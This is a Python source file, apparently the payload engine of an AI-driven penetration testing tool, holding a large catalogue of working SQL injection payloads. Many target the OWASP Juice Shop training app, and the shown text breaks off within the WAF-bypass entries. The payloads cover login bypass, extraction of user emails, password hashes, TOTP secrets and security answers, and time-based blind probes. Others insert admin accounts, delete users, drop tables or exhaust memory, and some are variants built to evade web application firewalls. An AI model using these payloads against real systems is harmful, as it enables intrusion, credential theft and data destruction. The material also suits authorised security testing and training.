"""
VAPT-AI V2.0 - Payload Engine (Complete)
=========================================
Intelligent context-aware payload generation engine for penetration testing.
Generates REAL, WORKING payloads adapted to target technology stack.

This engine provides:
- 400+ total payloads across 11 attack categories
- Context-aware prioritization (db_type, framework, WAF, OS)
- Encoding/obfuscation engine with 10+ encoding methods
- Variation generator for WAF bypass
- Login-specific payload extraction
- JWT secret brute force lists
- Default credential lists
- Chaining support (use findings to generate new payloads)
- Search and filter capabilities

Attack Categories:
  sqli, xss, auth_bypass, idor, path_traversal,
  nosqli, xxe, ssrf, jwt, file_upload, input_validation
"""

import base64
import copy
import hashlib
import html
import json
import random
import re
import string
import urllib.parse
from typing import Any, Dict, List, Optional, Tuple


# ================================================================== #
#  PAYLOAD DATA CLASS
# ================================================================== #

class Payload:
    """
    Represents a single security testing payload with full metadata.
    Every payload carries enough context for the scanner to understand
    what it does, what to look for, and when to use it.
    """

    def __init__(
        self,
        value: str,
        description: str,
        detection_hint: str,
        sub_type: str = "",
        db_specific: str = "",
        framework_specific: str = "",
        os_specific: str = "",
        severity: str = "medium",
        waf_bypass: bool = False,
        juice_shop: bool = False,
        tags: Optional[List[str]] = None,
    ):
        self.value = value
        self.description = description
        self.detection_hint = detection_hint
        self.sub_type = sub_type
        self.db_specific = db_specific
        self.framework_specific = framework_specific
        self.os_specific = os_specific
        self.severity = severity
        self.waf_bypass = waf_bypass
        self.juice_shop = juice_shop
        self.tags = tags if tags is not None else []

    def to_dict(self) -> dict:
        return {
            "value": self.value,
            "description": self.description,
            "detection_hint": self.detection_hint,
            "sub_type": self.sub_type,
            "db_specific": self.db_specific,
            "framework_specific": self.framework_specific,
            "os_specific": self.os_specific,
            "severity": self.severity,
            "waf_bypass": self.waf_bypass,
            "juice_shop": self.juice_shop,
            "tags": self.tags,
        }

    def __repr__(self) -> str:
        return f"Payload(value={self.value[:40]!r}, type={self.sub_type}, severity={self.severity})"


# ================================================================== #
#  PAYLOAD ENGINE - MAIN CLASS
# ================================================================== #

class PayloadEngine:
    """
    Context-aware payload generation engine for VAPT-AI V2.0.
    
    Usage:
        engine = PayloadEngine()
        
        # Get SQLi payloads optimized for SQLite
        payloads = engine.get_payloads("sqli", context={"db_type": "sqlite"})
        
        # Get XSS payloads optimized for Angular
        payloads = engine.get_payloads("xss", context={"framework": "angular"})
        
        # Get login bypass payloads
        payloads = engine.get_login_payloads()
        
        # Encode a payload
        encoded = engine.encode_payload("' OR 1=1--", "url")
        
        # Generate bypass variations
        variations = engine.generate_variations("' OR 1=1--")
    """

    def __init__(self):
        self._payloads: Dict[str, List[Payload]] = {}
        self._build_all_payloads()

    def _build_all_payloads(self):
        """Build all payload categories."""
        self._payloads["sqli"] = self._build_sqli_payloads()
        self._payloads["xss"] = self._build_xss_payloads()
        self._payloads["auth_bypass"] = self._build_auth_bypass_payloads()
        self._payloads["idor"] = self._build_idor_payloads()
        self._payloads["path_traversal"] = self._build_path_traversal_payloads()
        self._payloads["nosqli"] = self._build_nosql_payloads()
        self._payloads["xxe"] = self._build_xxe_payloads()
        self._payloads["ssrf"] = self._build_ssrf_payloads()
        self._payloads["jwt"] = self._build_jwt_payloads()
        self._payloads["file_upload"] = self._build_file_upload_payloads()
        self._payloads["input_validation"] = self._build_input_validation_payloads()

    # ================================================================== #
    #  SQL INJECTION PAYLOADS (65+)
    # ================================================================== #
    def _build_sqli_payloads(self) -> List[Payload]:
        payloads: List[Payload] = []

        # ============================================================ #
        #  SQLite Error-Based (Juice Shop Primary Target)
        # ============================================================ #
        payloads.append(Payload(
            value="' OR 1=1--",
            description="Classic OR-based tautology, bypasses WHERE clauses in SQLite",
            detection_hint="Returns all rows or login bypass succeeds. Look for multiple results or authentication success",
            sub_type="error_based",
            db_specific="sqlite",
            severity="critical",
            juice_shop=True,
            tags=["login_bypass", "where_clause", "tautology"],
        ))
        payloads.append(Payload(
            value="' OR 1=1/*",
            description="OR tautology with block comment terminator instead of --",
            detection_hint="Returns all rows. Useful when double-dash comment is filtered",
            sub_type="error_based",
            db_specific="sqlite",
            severity="critical",
            juice_shop=True,
            tags=["login_bypass", "comment_bypass"],
        ))
        payloads.append(Payload(
            value="' OR ''='",
            description="String equality tautology, avoids numeric comparison entirely",
            detection_hint="Returns all rows where string comparison is used in WHERE clause",
            sub_type="error_based",
            db_specific="sqlite",
            severity="critical",
            juice_shop=True,
            tags=["login_bypass", "string_tautology"],
        ))
        payloads.append(Payload(
            value="' OR 1=1; --",
            description="Tautology with semicolon for statement termination before comment",
            detection_hint="Check for all-row return or SQL error message leaking schema info",
            sub_type="error_based",
            db_specific="sqlite",
            severity="critical",
            tags=["login_bypass"],
        ))
        payloads.append(Payload(
            value="admin'--",
            description="Terminate query after admin username, comments out password check",
            detection_hint="Login succeeds as admin without providing valid password",
            sub_type="error_based",
            db_specific="sqlite",
            severity="critical",
            juice_shop=True,
            tags=["login_bypass", "admin_access"],
        ))
        payloads.append(Payload(
            value="' AND 1=CAST((SELECT sql FROM sqlite_master LIMIT 1) AS INTEGER)--",
            description="SQLite error-based extraction via CAST type mismatch. Forces SQL error containing schema",
            detection_hint="Error message contains CREATE TABLE statement from sqlite_master",
            sub_type="error_based",
            db_specific="sqlite",
            severity="critical",
            juice_shop=True,
            tags=["data_extraction", "schema_leak"],
        ))
        payloads.append(Payload(
            value="' AND 1=CAST((SELECT group_concat(tbl_name) FROM sqlite_master WHERE type='table') AS INTEGER)--",
            description="SQLite error-based: extract ALL table names via group_concat in CAST error",
            detection_hint="Error message contains comma-separated list of all table names",
            sub_type="error_based",
            db_specific="sqlite",
            severity="critical",
            juice_shop=True,
            tags=["data_extraction", "table_enumeration"],
        ))
        payloads.append(Payload(
            value="' AND 1=CAST((SELECT email FROM Users LIMIT 1) AS INTEGER)--",
            description="SQLite error-based: extract first user email via CAST error",
            detection_hint="Error message reveals email address from Users table",
            sub_type="error_based",
            db_specific="sqlite",
            severity="critical",
            juice_shop=True,
            tags=["data_extraction", "credential_leak"],
        ))
        payloads.append(Payload(
            value="' AND 1=CAST((SELECT password FROM Users WHERE email='admin@juice-sh.op') AS INTEGER)--",
            description="SQLite error-based: extract admin password hash from Juice Shop",
            detection_hint="Error message reveals admin password hash",
            sub_type="error_based",
            db_specific="sqlite",
            severity="critical",
            juice_shop=True,
            tags=["data_extraction", "credential_leak", "admin"],
        ))
        payloads.append(Payload(
            value="' AND randomblob(1000000000)--",
            description="SQLite resource exhaustion via randomblob generating 1GB of data",
            detection_hint="Application hangs, returns timeout, or crashes with memory error",
            sub_type="error_based",
            db_specific="sqlite",
            severity="high",
            tags=["dos", "resource_exhaustion"],
        ))
        payloads.append(Payload(
            value="')) OR 1=1--",
            description="Double parenthesis close for queries wrapped in nested parentheses",
            detection_hint="Bypasses queries with double parenthesis wrapping like WHERE ((col='val'))",
            sub_type="error_based",
            db_specific="sqlite",
            severity="high",
            juice_shop=True,
            tags=["login_bypass", "parenthesis"],
        ))
        payloads.append(Payload(
            value="'))) OR 1=1--",
            description="Triple parenthesis close for deeply nested WHERE clauses",
            detection_hint="Bypasses queries with triple parenthesis wrapping",
            sub_type="error_based",
            db_specific="sqlite",
            severity="high",
            tags=["login_bypass", "parenthesis"],
        ))
        payloads.append(Payload(
            value="' OR 1=1 LIMIT 1--",
            description="OR tautology with LIMIT 1 to return only first user (avoids multi-row errors)",
            detection_hint="Login succeeds as first user in database, no multi-row error",
            sub_type="error_based",
            db_specific="sqlite",
            severity="critical",
            juice_shop=True,
            tags=["login_bypass", "single_row"],
        ))
        payloads.append(Payload(
            value="' OR 1=1 LIMIT 1 OFFSET 1--",
            description="OR tautology returning second user (offset 1)",
            detection_hint="Login as second user in table, useful for testing non-admin accounts",
            sub_type="error_based",
            db_specific="sqlite",
            severity="high",
            tags=["login_bypass", "user_enumeration"],
        ))
        payloads.append(Payload(
            value="qwert' OR 1=1--",
            description="Garbage prefix with OR tautology for search-type input fields",
            detection_hint="Returns all results regardless of search term prefix",
            sub_type="error_based",
            db_specific="sqlite",
            severity="high",
            juice_shop=True,
            tags=["search_bypass"],
        ))
        payloads.append(Payload(
            value="1' OR '1'='1",
            description="String-based OR tautology without trailing comment (self-closing quotes)",
            detection_hint="Returns all rows without needing comment to terminate query",
            sub_type="error_based",
            db_specific="generic",
            severity="high",
            tags=["login_bypass", "no_comment"],
        ))
        payloads.append(Payload(
            value="' OR 'x'='x",
            description="String tautology using arbitrary character comparison",
            detection_hint="Always-true condition returns all rows",
            sub_type="error_based",
            db_specific="generic",
            severity="high",
            tags=["login_bypass"],
        ))
        payloads.append(Payload(
            value="' OR 1=1 OR '1'='1",
            description="Multiple OR conditions for maximum coverage",
            detection_hint="Returns all rows through redundant tautology",
            sub_type="error_based",
            db_specific="generic",
            severity="high",
            tags=["login_bypass"],
        ))
        payloads.append(Payload(
            value="'; --",
            description="Simple quote-semicolon-comment to test for SQL injection presence",
            detection_hint="SQL error message reveals injection point exists",
            sub_type="error_based",
            db_specific="generic",
            severity="medium",
            tags=["detection", "probe"],
        ))
        payloads.append(Payload(
            value="'",
            description="Single quote probe - simplest SQLi detection test",
            detection_hint="SQL syntax error in response confirms injection point",
            sub_type="error_based",
            db_specific="generic",
            severity="low",
            tags=["detection", "probe"],
        ))
        payloads.append(Payload(
            value="''",
            description="Double single-quote probe - should NOT cause error (escaped quote)",
            detection_hint="Compare with single-quote response. If different, confirms SQLi",
            sub_type="error_based",
            db_specific="generic",
            severity="low",
            tags=["detection", "probe"],
        ))
        payloads.append(Payload(
            value="' AND 'x'='y",
            description="False condition probe - should return empty/different results",
            detection_hint="Compare with true condition (' AND 'x'='x). Different = SQLi confirmed",
            sub_type="error_based",
            db_specific="generic",
            severity="low",
            tags=["detection", "probe"],
        ))

        # ============================================================ #
        #  SQLite UNION-Based (Data Extraction)
        # ============================================================ #
        payloads.append(Payload(
            value="' UNION SELECT sql FROM sqlite_master--",
            description="Extract all table definitions (CREATE TABLE statements) from SQLite",
            detection_hint="Response contains CREATE TABLE statements revealing schema",
            sub_type="union_based",
            db_specific="sqlite",
            severity="critical",
            juice_shop=True,
            tags=["data_extraction", "schema_leak"],
        ))
        payloads.append(Payload(
            value="' UNION SELECT name FROM sqlite_master WHERE type='table'--",
            description="List all user-created table names in SQLite database",
            detection_hint="Response contains table names like Users, Products, BasketItems",
            sub_type="union_based",
            db_specific="sqlite",
            severity="critical",
            juice_shop=True,
            tags=["data_extraction", "table_enumeration"],
        ))
        payloads.append(Payload(
            value="' UNION SELECT group_concat(name,',') FROM sqlite_master WHERE type='table'--",
            description="Concatenate ALL table names into single comma-separated output",
            detection_hint="Single string with all table names separated by commas",
            sub_type="union_based",
            db_specific="sqlite",
            severity="critical",
            juice_shop=True,
            tags=["data_extraction", "table_enumeration"],
        ))
        payloads.append(Payload(
            value="' UNION SELECT group_concat(email||':'||password,'\n') FROM Users--",
            description="Extract all email:password pairs from Users table with newline separation",
            detection_hint="Email addresses and password hashes appear in response",
            sub_type="union_based",
            db_specific="sqlite",
            severity="critical",
            juice_shop=True,
            tags=["data_extraction", "credential_leak"],
        ))
        payloads.append(Payload(
            value="' UNION SELECT group_concat(email||':'||password||':'||role,'\n') FROM Users--",
            description="Extract email, password hash, AND role from Users (3 fields)",
            detection_hint="Credential pairs with role information (admin, customer, etc.)",
            sub_type="union_based",
            db_specific="sqlite",
            severity="critical",
            juice_shop=True,
            tags=["data_extraction", "credential_leak", "role_enumeration"],
        ))
        payloads.append(Payload(
            value="' UNION SELECT sqlite_version()--",
            description="Extract SQLite version number to confirm database type",
            detection_hint="Version string like 3.x.x appears in response",
            sub_type="union_based",
            db_specific="sqlite",
            severity="medium",
            juice_shop=True,
            tags=["fingerprint", "version_detection"],
        ))
        payloads.append(Payload(
            value="' UNION SELECT typeof(1)--",
            description="Confirm SQLite database via typeof() function (SQLite-specific function)",
            detection_hint="Response contains 'integer' string, confirming SQLite",
            sub_type="union_based",
            db_specific="sqlite",
            severity="low",
            tags=["fingerprint"],
        ))
        payloads.append(Payload(
            value="' UNION SELECT tbl_name FROM sqlite_master WHERE type='table' AND tbl_name NOT LIKE 'sqlite_%'--",
            description="List only application tables (exclude SQLite internal tables)",
            detection_hint="Only application table names appear (Users, Products, etc.)",
            sub_type="union_based",
            db_specific="sqlite",
            severity="critical",
            juice_shop=True,
            tags=["data_extraction", "table_enumeration"],
        ))
        payloads.append(Payload(
            value="' UNION SELECT group_concat(name||':'||type,',') FROM pragma_table_info('Users')--",
            description="Extract column names and data types from Users table via PRAGMA",
            detection_hint="Column definitions like id:INTEGER, email:TEXT, password:TEXT",
            sub_type="union_based",
            db_specific="sqlite",
            severity="critical",
            juice_shop=True,
            tags=["data_extraction", "column_enumeration"],
        ))
        payloads.append(Payload(
            value="' UNION SELECT group_concat(name||':'||type,',') FROM pragma_table_info('Products')--",
            description="Extract column names from Products table",
            detection_hint="Product table schema: id, name, description, price, etc.",
            sub_type="union_based",
            db_specific="sqlite",
            severity="high",
            juice_shop=True,
            tags=["data_extraction", "column_enumeration"],
        ))
        payloads.append(Payload(
            value="' UNION SELECT group_concat(name||':'||type,',') FROM pragma_table_info('BasketItems')--",
            description="Extract column names from BasketItems table (Juice Shop cart)",
            detection_hint="BasketItem schema revealing relationships",
            sub_type="union_based",
            db_specific="sqlite",
            severity="high",
            juice_shop=True,
            tags=["data_extraction", "column_enumeration"],
        ))
        payloads.append(Payload(
            value="' UNION SELECT id,email,password,role,deluxeToken,lastLoginIp,profileImage,totpSecret,isActive FROM Users--",
            description="Full Users table extraction with all 9 columns (Juice Shop schema)",
            detection_hint="Complete user records including TOTP secrets and tokens",
            sub_type="union_based",
            db_specific="sqlite",
            severity="critical",
            juice_shop=True,
            tags=["data_extraction", "full_dump"],
        ))
        payloads.append(Payload(
            value="' UNION SELECT email,password,role FROM Users WHERE role='admin'--",
            description="Extract only admin user credentials from Users table",
            detection_hint="Admin email and password hash in response",
            sub_type="union_based",
            db_specific="sqlite",
            severity="critical",
            juice_shop=True,
            tags=["data_extraction", "admin_credentials"],
        ))
        payloads.append(Payload(
            value="' UNION SELECT group_concat(answer,',') FROM SecurityAnswers--",
            description="Extract security question answers from SecurityAnswers table",
            detection_hint="Security answers that can be used for password reset",
            sub_type="union_based",
            db_specific="sqlite",
            severity="critical",
            juice_shop=True,
            tags=["data_extraction", "security_answers"],
        ))
        payloads.append(Payload(
            value="' UNION SELECT group_concat(UserId||':'||answer,'\n') FROM SecurityAnswers--",
            description="Extract user ID to security answer mappings",
            detection_hint="User IDs paired with their security answers for password reset attacks",
            sub_type="union_based",
            db_specific="sqlite",
            severity="critical",
            juice_shop=True,
            tags=["data_extraction", "security_answers", "chaining"],
        ))

        # --- UNION Column Count Detection ---
        for col_count in range(1, 13):
            null_list = ",".join(["NULL"] * col_count)
            payloads.append(Payload(
                value=f"' UNION SELECT {null_list}--",
                description=f"Column count probe: {col_count} column(s) via UNION SELECT NULL",
                detection_hint=f"No error means target query has exactly {col_count} column(s)",
                sub_type="union_based",
                db_specific="generic",
                severity="medium",
                tags=["column_count", "probe"],
            ))

        # --- ORDER BY Column Count Detection ---
        for order_num in [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 15, 20]:
            payloads.append(Payload(
                value=f"' ORDER BY {order_num}--",
                description=f"Column count detection via ORDER BY {order_num}",
                detection_hint=f"Error means fewer than {order_num} columns. No error means >= {order_num}",
                sub_type="union_based",
                db_specific="generic",
                severity="low",
                tags=["column_count", "probe"],
            ))

        # ============================================================ #
        #  Boolean-Based Blind SQL Injection
        # ============================================================ #
        payloads.append(Payload(
            value="' AND 1=1--",
            description="Boolean blind TRUE condition: page should load normally",
            detection_hint="Compare response length/content with FALSE condition (AND 1=2). Difference confirms SQLi",
            sub_type="boolean_blind",
            db_specific="generic",
            severity="high",
            tags=["blind", "boolean", "probe"],
        ))
        payloads.append(Payload(
            value="' AND 1=2--",
            description="Boolean blind FALSE condition: page should differ from true",
            detection_hint="Response differs from true condition (AND 1=1) in content/length",
            sub_type="boolean_blind",
            db_specific="generic",
            severity="high",
            tags=["blind", "boolean", "probe"],
        ))
        payloads.append(Payload(
            value="' AND (SELECT COUNT(*) FROM sqlite_master)>0--",
            description="Boolean blind: confirm SQLite by checking if sqlite_master has entries",
            detection_hint="Normal/true response confirms SQLite database engine",
            sub_type="boolean_blind",
            db_specific="sqlite",
            severity="high",
            juice_shop=True,
            tags=["blind", "fingerprint"],
        ))
        payloads.append(Payload(
            value="' AND (SELECT COUNT(*) FROM Users)>0--",
            description="Boolean blind: confirm Users table exists and has rows",
            detection_hint="True response confirms Users table exists with data",
            sub_type="boolean_blind",
            db_specific="sqlite",
            severity="high",
            juice_shop=True,
            tags=["blind", "table_detection"],
        ))
        payloads.append(Payload(
            value="' AND (SELECT LENGTH(email) FROM Users LIMIT 1)>0--",
            description="Boolean blind: check if first user email has non-zero length",
            detection_hint="True response confirms email field contains data",
            sub_type="boolean_blind",
            db_specific="sqlite",
            severity="high",
            juice_shop=True,
            tags=["blind", "data_extraction"],
        ))
        payloads.append(Payload(
            value="' AND SUBSTR((SELECT email FROM Users LIMIT 1),1,1)='a'--",
            description="Boolean blind: extract first char of first email (check if 'a')",
            detection_hint="True response confirms first character. Iterate through alphabet",
            sub_type="boolean_blind",
            db_specific="sqlite",
            severity="high",
            juice_shop=True,
            tags=["blind", "char_extraction"],
        ))
        payloads.append(Payload(
            value="' AND SUBSTR((SELECT password FROM Users WHERE email='admin@juice-sh.op'),1,1)='0'--",
            description="Boolean blind: extract first char of admin password hash",
            detection_hint="True/false response reveals password hash character by character",
            sub_type="boolean_blind",
            db_specific="sqlite",
            severity="critical",
            juice_shop=True,
            tags=["blind", "credential_extraction"],
        ))
        payloads.append(Payload(
            value="' AND (SELECT COUNT(*) FROM Users WHERE role='admin')>0--",
            description="Boolean blind: check if any admin role users exist",
            detection_hint="True response confirms admin users present in database",
            sub_type="boolean_blind",
            db_specific="sqlite",
            severity="high",
            juice_shop=True,
            tags=["blind", "role_detection"],
        ))
        payloads.append(Payload(
            value="' AND LENGTH((SELECT group_concat(tbl_name) FROM sqlite_master WHERE type='table'))>0--",
            description="Boolean blind: confirm tables exist via group_concat length check",
            detection_hint="True response confirms application tables are present",
            sub_type="boolean_blind",
            db_specific="sqlite",
            severity="high",
            tags=["blind", "table_detection"],
        ))
        payloads.append(Payload(
            value="' AND UNICODE(SUBSTR((SELECT email FROM Users LIMIT 1),1,1))>96--",
            description="Boolean blind: binary search on first char ASCII value (>96 = lowercase)",
            detection_hint="Use binary search: >64=uppercase, >96=lowercase, narrow down",
            sub_type="boolean_blind",
            db_specific="sqlite",
            severity="high",
            tags=["blind", "binary_search"],
        ))

        # ============================================================ #
        #  Time-Based Blind SQL Injection
        # ============================================================ #
        payloads.append(Payload(
            value="' AND (SELECT CASE WHEN 1=1 THEN RANDOMBLOB(100000000) ELSE 1 END)--",
            description="SQLite time-based blind via heavy computation (randomblob generates ~100MB)",
            detection_hint="Response takes noticeably longer (2-5s delay) compared to normal request",
            sub_type="time_blind",
            db_specific="sqlite",
            severity="high",
            juice_shop=True,
            tags=["blind", "time_based"],
        ))
        payloads.append(Payload(
            value="' AND (SELECT CASE WHEN (SELECT COUNT(*) FROM Users)>0 THEN RANDOMBLOB(200000000) ELSE 1 END)--",
            description="SQLite time-based blind: confirm Users table exists via delay",
            detection_hint="Delay confirms Users table has rows. No delay means false condition",
            sub_type="time_blind",
            db_specific="sqlite",
            severity="high",
            juice_shop=True,
            tags=["blind", "time_based", "table_detection"],
        ))
        payloads.append(Payload(
            value="' AND (SELECT CASE WHEN SUBSTR((SELECT email FROM Users LIMIT 1),1,1)='a' THEN RANDOMBLOB(200000000) ELSE 1 END)--",
            description="SQLite time-based blind: extract first char of email via delay",
            detection_hint="Delay on 'a' confirms first character. Test each char systematically",
            sub_type="time_blind",
            db_specific="sqlite",
            severity="high",
            juice_shop=True,
            tags=["blind", "time_based", "char_extraction"],
        ))
        payloads.append(Payload(
            value="' AND SLEEP(5)--",
            description="MySQL time-based blind: 5 second delay via SLEEP function",
            detection_hint="Response delayed by approximately 5 seconds confirms MySQL injection",
            sub_type="time_blind",
            db_specific="mysql",
            severity="high",
            tags=["blind", "time_based"],
        ))
        payloads.append(Payload(
            value="' AND (SELECT SLEEP(5))--",
            description="MySQL time-based blind: SLEEP in subquery",
            detection_hint="5 second delay confirms MySQL injection in subquery context",
            sub_type="time_blind",
            db_specific="mysql",
            severity="high",
            tags=["blind", "time_based"],
        ))
        payloads.append(Payload(
            value="' OR IF(1=1, SLEEP(5), 0)--",
            description="MySQL conditional time-based blind with IF function",
            detection_hint="5 second delay on true condition, instant on false",
            sub_type="time_blind",
            db_specific="mysql",
            severity="high",
            tags=["blind", "time_based", "conditional"],
        ))
        payloads.append(Payload(
            value="' AND BENCHMARK(10000000,SHA1('test'))--",
            description="MySQL time-based blind via BENCHMARK (CPU-intensive hashing)",
            detection_hint="Response delayed by CPU-intensive operation",
            sub_type="time_blind",
            db_specific="mysql",
            severity="high",
            tags=["blind", "time_based"],
        ))
        payloads.append(Payload(
            value="'; WAITFOR DELAY '0:0:5'--",
            description="MSSQL time-based blind: WAITFOR DELAY causes 5 second wait",
            detection_hint="Response delayed by exactly 5 seconds confirms MSSQL injection",
            sub_type="time_blind",
            db_specific="mssql",
            severity="high",
            tags=["blind", "time_based"],
        ))
        payloads.append(Payload(
            value="'; WAITFOR DELAY '0:0:10'--",
            description="MSSQL time-based blind: 10 second delay for noisy networks",
            detection_hint="10 second delay distinguishable from network latency",
            sub_type="time_blind",
            db_specific="mssql",
            severity="high",
            tags=["blind", "time_based"],
        ))
        payloads.append(Payload(
            value="' AND pg_sleep(5)--",
            description="PostgreSQL time-based blind: pg_sleep causes 5 second delay",
            detection_hint="5 second delay confirms PostgreSQL injection",
            sub_type="time_blind",
            db_specific="postgresql",
            severity="high",
            tags=["blind", "time_based"],
        ))
        payloads.append(Payload(
            value="' AND (SELECT pg_sleep(5))--",
            description="PostgreSQL time-based blind: pg_sleep in subquery",
            detection_hint="5 second delay in subquery context",
            sub_type="time_blind",
            db_specific="postgresql",
            severity="high",
            tags=["blind", "time_based"],
        ))

        # ============================================================ #
        #  Stacked Queries
        # ============================================================ #
        payloads.append(Payload(
            value="'; SELECT * FROM Users--",
            description="Stacked query to extract entire Users table",
            detection_hint="Additional result set or user data in response",
            sub_type="stacked",
            db_specific="generic",
            severity="critical",
            tags=["data_extraction"],
        ))
        payloads.append(Payload(
            value="'; UPDATE Users SET role='admin' WHERE email='test@test.com'--",
            description="Stacked query privilege escalation: set user role to admin",
            detection_hint="User role silently changed to admin",
            sub_type="stacked",
            db_specific="generic",
            severity="critical",
            tags=["privilege_escalation"],
        ))
        payloads.append(Payload(
            value="'; INSERT INTO Users (email,password,role) VALUES ('hacker@evil.com','hacked','admin')--",
            description="Stacked query: insert new admin user into database",
            detection_hint="New admin user created, can login with inserted credentials",
            sub_type="stacked",
            db_specific="generic",
            severity="critical",
            tags=["account_creation", "privilege_escalation"],
        ))
        payloads.append(Payload(
            value="'; DELETE FROM Users WHERE email='victim@test.com'--",
            description="Stacked query: delete a specific user account",
            detection_hint="User account removed from database",
            sub_type="stacked",
            db_specific="generic",
            severity="critical",
            tags=["data_destruction"],
        ))
        payloads.append(Payload(
            value="'; DROP TABLE Users--",
            description="Stacked query: DROP entire Users table (destructive)",
            detection_hint="Users table destroyed, application breaks",
            sub_type="stacked",
            db_specific="generic",
            severity="critical",
            tags=["data_destruction", "dos"],
        ))

        # ============================================================ #
        #  MySQL Error-Based
        # ============================================================ #
        payloads.append(Payload(
            value="' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e))--",
            description="MySQL error-based extraction via EXTRACTVALUE XPath error",
            detection_hint="Error message contains MySQL version string between ~ characters",
            sub_type="error_based",
            db_specific="mysql",
            severity="critical",
            tags=["data_extraction", "version"],
        ))
        payloads.append(Payload(
            value="' AND UPDATEXML(1,CONCAT(0x7e,(SELECT user()),0x7e),1)--",
            description="MySQL error-based extraction via UPDATEXML XPath error",
            detection_hint="Error message contains current database user",
            sub_type="error_based",
            db_specific="mysql",
            severity="critical",
            tags=["data_extraction", "user_enumeration"],
        ))
        payloads.append(Payload(
            value="' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT database()),0x7e))--",
            description="MySQL error-based: extract current database name",
            detection_hint="Error contains database name between ~ characters",
            sub_type="error_based",
            db_specific="mysql",
            severity="critical",
            tags=["data_extraction", "database_name"],
        ))
        payloads.append(Payload(
            value="' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()),0x7e))--",
            description="MySQL error-based: extract all table names from current database",
            detection_hint="Error contains comma-separated table names",
            sub_type="error_based",
            db_specific="mysql",
            severity="critical",
            tags=["data_extraction", "table_enumeration"],
        ))
        payloads.append(Payload(
            value="' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT database()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
            description="MySQL error-based double query with FLOOR/RAND",
            detection_hint="Duplicate entry error contains database name",
            sub_type="error_based",
            db_specific="mysql",
            severity="critical",
            tags=["data_extraction"],
        ))
        payloads.append(Payload(
            value="' AND EXP(~(SELECT * FROM (SELECT version())a))--",
            description="MySQL error-based via EXP mathematical overflow",
            detection_hint="Double overflow error contains version string",
            sub_type="error_based",
            db_specific="mysql",
            severity="critical",
            tags=["data_extraction", "version"],
        ))

        # ============================================================ #
        #  PostgreSQL Error-Based
        # ============================================================ #
        payloads.append(Payload(
            value="' AND 1=CAST((SELECT version()) AS INTEGER)--",
            description="PostgreSQL error-based via CAST type mismatch",
            detection_hint="Error message contains full PostgreSQL version string",
            sub_type="error_based",
            db_specific="postgresql",
            severity="critical",
            tags=["data_extraction", "version"],
        ))
        payloads.append(Payload(
            value="' AND 1=CAST((SELECT current_database()) AS INTEGER)--",
            description="PostgreSQL error-based: extract current database name via CAST",
            detection_hint="Error reveals current database name",
            sub_type="error_based",
            db_specific="postgresql",
            severity="critical",
            tags=["data_extraction", "database_name"],
        ))
        payloads.append(Payload(
            value="' AND 1=CAST((SELECT current_user) AS INTEGER)--",
            description="PostgreSQL error-based: extract current user via CAST",
            detection_hint="Error reveals current database user",
            sub_type="error_based",
            db_specific="postgresql",
            severity="critical",
            tags=["data_extraction", "user_enumeration"],
        ))
        payloads.append(Payload(
            value="'||(SELECT '')||'",
            description="PostgreSQL string concatenation probe (|| operator)",
            detection_hint="No error confirms PostgreSQL-style string concatenation works",
            sub_type="error_based",
            db_specific="postgresql",
            severity="medium",
            tags=["fingerprint", "probe"],
        ))
        payloads.append(Payload(
            value="' AND 1=CAST((SELECT string_agg(tablename,',') FROM pg_tables WHERE schemaname='public') AS INTEGER)--",
            description="PostgreSQL error-based: extract all public table names",
            detection_hint="Error contains comma-separated public table names",
            sub_type="error_based",
            db_specific="postgresql",
            severity="critical",
            tags=["data_extraction", "table_enumeration"],
        ))

        # ============================================================ #
        #  MSSQL Error-Based
        # ============================================================ #
        payloads.append(Payload(
            value="' AND 1=CONVERT(int,(SELECT @@version))--",
            description="MSSQL error-based via CONVERT type mismatch",
            detection_hint="Error message contains full MSSQL version and OS info",
            sub_type="error_based",
            db_specific="mssql",
            severity="critical",
            tags=["data_extraction", "version"],
        ))
        payloads.append(Payload(
            value="' AND 1=CONVERT(int,(SELECT DB_NAME()))--",
            description="MSSQL error-based: extract current database name",
            detection_hint="Error reveals current database name",
            sub_type="error_based",
            db_specific="mssql",
            severity="critical",
            tags=["data_extraction", "database_name"],
        ))
        payloads.append(Payload(
            value="' AND 1=CONVERT(int,(SELECT SYSTEM_USER))--",
            description="MSSQL error-based: extract system user",
            detection_hint="Error reveals MSSQL system user account",
            sub_type="error_based",
            db_specific="mssql",
            severity="critical",
            tags=["data_extraction", "user_enumeration"],
        ))
        payloads.append(Payload(
            value="' AND 1=CONVERT(int,(SELECT TOP 1 name FROM sysobjects WHERE xtype='U'))--",
            description="MSSQL error-based: extract first user table name",
            detection_hint="Error contains first application table name",
            sub_type="error_based",
            db_specific="mssql",
            severity="critical",
            tags=["data_extraction", "table_enumeration"],
        ))

        # ============================================================ #
        #  WAF Bypass SQLi Variants
        # ============================================================ #
        payloads.append(Payload(
            value="' oR 1=1--",
            description="Mixed case OR to bypass case-sensitive WAF rules",
            detection_hint="WAF bypass: mixed case OR still evaluated by SQL engine",
            sub_type="waf_bypass",
            db_specific="generic",
            severity="high",
            waf_bypass=True,
            tags=["waf_bypass", "case_change"],
        ))
        payloads.append(Payload(
            value="'/**/OR/**/1=1--",
            description="SQL comments replacing spaces to bypass WAF space detection",
            detection_hint="WAF bypass: inline comments act as whitespace in SQL",
            sub_type="waf_bypass",
            db_specific="generic",
            severity="high",
            waf_bypass=True,
            tags=["waf_bypass", "comment_bypass"],
        ))
        payloads.append(Payload(
            value="' OR%0b1=1--",
            description="Vertical tab (0x0B) as whitespace bypass",
            detection_hint="WAF bypass: vertical tab treated as whitespace by SQL parser",
            sub_type="waf_bypass",
            db_specific="generic",
            severity="high",
            waf_bypass=True,
            tags=["waf_bypass", "whitespace"],
        ))
        payloads.append(Payload(
            value="' OR\t1=1--",
            description="Tab character as space replacement for WAF bypass",
            detection_hint="WAF bypass: tab character treated as space by SQL engine",
            sub_type="waf_bypass",
            db_specific="generic",
            severity="high",
            waf_bypass=True,
            tags=["waf_bypass", "whitespace"],
        ))
        payloads.append(Payload(
            value="' OR\n1=1--",
            description="Newline as space replacement for WAF bypass",
            detection_hint="WAF bypass: newline treated as whitespace separator",
            sub_type="waf_bypass",
            db_specific="generic",
            severity="high",
            waf_bypass=True,
